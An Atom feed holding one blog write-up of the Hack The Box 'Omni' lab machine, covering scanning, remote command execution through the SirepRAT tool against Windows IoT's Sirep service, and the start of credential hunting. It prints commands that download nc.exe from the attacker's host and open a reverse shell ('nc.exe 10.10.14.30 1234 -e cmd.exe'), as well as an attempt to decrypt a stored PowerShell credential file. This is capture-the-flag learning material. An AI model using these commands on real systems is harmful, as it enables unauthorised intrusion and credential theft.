<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-05-25T21:34:00+05:30</updated><id>http://localhost:4000/atom.xml</id><title type="html">Girish K</title><subtitle>Cyber Security Enthusiast | eJPT</subtitle><author><name>Girish</name></author><entry><title type="html">Hack The Box - Omni</title><link href="http://localhost:4000/hackthebox/2021/01/09/HTB-Omni/" rel="alternate" type="text/html" title="Hack The Box - Omni" /><published>2021-01-09T00:00:00+05:30</published><updated>2021-01-09T00:00:00+05:30</updated><id>http://localhost:4000/hackthebox/2021/01/09/HTB-Omni</id><content type="html" xml:base="http://localhost:4000/hackthebox/2021/01/09/HTB-Omni/">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Link: &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/271&quot;&gt;https://www.hackthebox.eu/home/machines/profile/271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs Begin with our Initial Nmap Scan.&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan-results&quot;&gt;Nmap Scan Results&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.80%I=7%D=8/23%Time=5F426145%P=x86_64-pc-linux-gnu%r(N
SF:ULL,10,&quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(GenericLines,10,&quot;
SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(Help,10,&quot;\*LY\xa5\xfb`\x0
SF:4G\xa9m\x1c\xc9}\xc8O\x12&quot;)%r(JavaRMI,10,&quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\x
SF:c9}\xc8O\x12&quot;);
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (86%)
OS CPE: cpe:/o:microsoft:windows_xp::sp2
Aggressive OS guesses: Microsoft Windows XP SP2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   206.35 ms 10.10.14.1
2   206.28 ms 10.10.10.204
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;

&lt;p&gt;Started with the webservice running on Port 8080. Checking that reveals its a &lt;strong&gt;Windows Device Portal.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;And it‚Äôs asking for Username and Password. I tried some default credentials and none worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%201.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%201.png&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is Windows Device Portal? 
The Windows Device Portal lets you configure and manage your device remotely over a network or USB connection. ‚Ä¶ Windows Device Portal is a web server on your device that you can connect to from a web browser on a PC. If your device has a web browser, you can also connect locally with the browser on that device. It works like an IoT.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So I googled for default Credentials and found this. And That too didn‚Äôt work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal&quot;&gt;https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%202.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%202.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;getting-shell&quot;&gt;Getting Shell&lt;/h2&gt;

&lt;p&gt;Next, I googled for any exploit available for Windows Core IOT. And Found this GitHub repo.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/SafeBreach-Labs/SirepRAT&quot;&gt;https://github.com/SafeBreach-Labs/SirepRAT&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The tool will exploit Sirep Test Service which  is used to perform driver/hardware tests on the IoT device and that‚Äôs built in and running on the official images offered at Microsoft‚Äôs site. So I tested whether its working or not. I tried to ping my device and it works.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ‚îÄ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rootüê∫kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/boxes/omni/SirepRAT]
‚îî‚îÄ# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput &lt;span class=&quot;nt&quot;&gt;--return_output&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cmd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;md.exe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c ping 10.10.14.30&quot;&lt;/span&gt; 
&amp;lt;HResultResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 1, payload length: 4, HResult: 0x0&amp;gt;
&amp;lt;OutputStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 11, payload length: 98, payload peek: &lt;span class=&quot;s1&quot;&gt;'Pinging 10.10.14.30 with 32 bytes of data:Repl'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;OutputStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 11, payload length: 52, payload peek: &lt;span class=&quot;s1&quot;&gt;'Reply from 10.10.14.30: bytes=32 time=757ms TTL=63'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;OutputStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 11, payload length: 52, payload peek: &lt;span class=&quot;s1&quot;&gt;'Reply from 10.10.14.30: bytes=32 time=456ms TTL=63'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;OutputStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 11, payload length: 249, payload peek: &lt;span class=&quot;s1&quot;&gt;'Reply from 10.10.14.30: bytes=32 time=203ms TTL=63'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;ErrorStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 12, payload length: 4, payload peek: &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Time to Get Shell, In first Command I uploaded the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; and in next command I tried to run it but I get some compatible error.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;‚îå‚îÄ‚îÄ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rootüê∫kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/boxes/omni/SirepRAT]
‚îî‚îÄ# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput &lt;span class=&quot;nt&quot;&gt;--return_output&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cmd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;md.exe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c powershell.exe -command Invoke-WebRequest -Uri 'http://10.10.14.30/nc.exe' -OutFile 'C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rivers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;olor&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe'&quot;&lt;/span&gt;
&amp;lt;HResultResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 1, payload length: 4, HResult: 0x0&amp;gt;
‚îå‚îÄ‚îÄ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rootüê∫kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/htb/boxes/omni/SirepRAT]
‚îî‚îÄ# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput &lt;span class=&quot;nt&quot;&gt;--return_output&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--cmd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;md.exe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--args&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rivers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;olor&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe 10.10.14.30 1234 -e cmd.exe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--v&lt;/span&gt; 
&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;
This version of C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;pool&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;rivers&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;olor&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe is not compatible with the version of Windows you&lt;span class=&quot;s1&quot;&gt;'re running. Check your computer'&lt;/span&gt;s system information and &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;contact the software publisher.

&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;
&amp;lt;HResultResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 1, payload length: 4, HResult: 0x0&amp;gt;
&amp;lt;OutputStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 11, payload length: 208, payload peek: &lt;span class=&quot;s1&quot;&gt;'This version of C:\windows\system32\spool\drivers\'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;ErrorStreamResult | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: 12, payload length: 4, payload peek: &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So I searched for other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; there is a lot of them in GitHub. And I got this one.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://github.com/int0x33/nc.exe&quot;&gt;https://github.com/int0x33/nc.exe&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Used the same command and started my netcat listener.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%203.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%203.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And I got a shell. It‚Äôs weird I can‚Äôt even run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%204.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%204.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I enumerated all the folders and in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data\Users&lt;/code&gt; there is app and Administrator directory, where I have access on them both. While checking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app&lt;/code&gt; directory I found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iot-admin.xml&lt;/code&gt; and is encrypted using Powershell it uses Get-Credential, Export-CliXml, and Import-CliXml to store and retrieve username and passwords.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt;dir
&lt;span class=&quot;nb&quot;&gt;dir
 &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp

08/24/2020  08:33 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
08/24/2020  08:33 AM    &amp;lt;DIR&amp;gt;          ..
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          3D Objects
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Documents
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Downloads
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Favorites
07/04/2020  08:20 PM               344 hardening.txt
07/04/2020  08:14 PM             1,858 iot-admin.xml
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Music
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Pictures
07/04/2020  09:53 PM             1,958 user.txt
07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Videos
               3 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          4,160 bytes
               9 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4,690,165,760 bytes free

C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt;type iot-admin.xml
&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;iot-admin.xml
&amp;lt;Objs &lt;span class=&quot;nv&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
  &amp;lt;Obj &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &amp;lt;TN &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;S &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UserName&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;omni&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator&amp;lt;/S&amp;gt;
      &amp;lt;SS &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&amp;lt;/SS&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I googled about how to decrypt it and found this link and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$cred=Import-CliXml -Path &amp;lt;file&amp;gt;; $cred.GetNetworkCredential().Password&lt;/code&gt; this is the command which helps to decrypt.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx&quot;&gt;https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In our case, I get some error. I can‚Äôt decrypt it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt;powershell.exe &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=Import-CliXml -Path C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ata&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ot-admin.xml; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.GetNetworkCredential().Password&quot;&lt;/span&gt;
powershell.exe &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=Import-CliXml -Path C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ata&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ot-admin.xml; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.GetNetworkCredential().Password&quot;&lt;/span&gt;
Import-CliXml : Error occurred during a cryptographic operation.
At line:1 char:7
+ &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Import-CliXml &lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt; C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;ot-admin.xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;.GetN ...
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Import-Clixml], Cryptographic 
   Exception
    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
   ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
 
You cannot call a method on a null-valued expression.
At line:1 char:60
+ ... :&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;ot-admin.xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;.GetNetworkCredential&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.Password
+                                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;, RuntimeException
    + FullyQualifiedErrorId : InvokeMethodOnNull
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I even have access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; directory, I can read those files and they are also encrypted and I can‚Äôt decrypt them too.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator&amp;gt;dir
&lt;span class=&quot;nb&quot;&gt;dir
 &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator

08/24/2020  05:29 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
08/24/2020  05:29 AM    &amp;lt;DIR&amp;gt;          ..
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          3D Objects
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Documents
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Downloads
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Favorites
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Music
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Pictures
07/04/2020  09:48 PM             1,958 root.txt
07/04/2020  09:48 PM             1,958 root.xml
07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Videos
               2 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          3,916 bytes
               9 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   4,690,165,760 bytes free
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

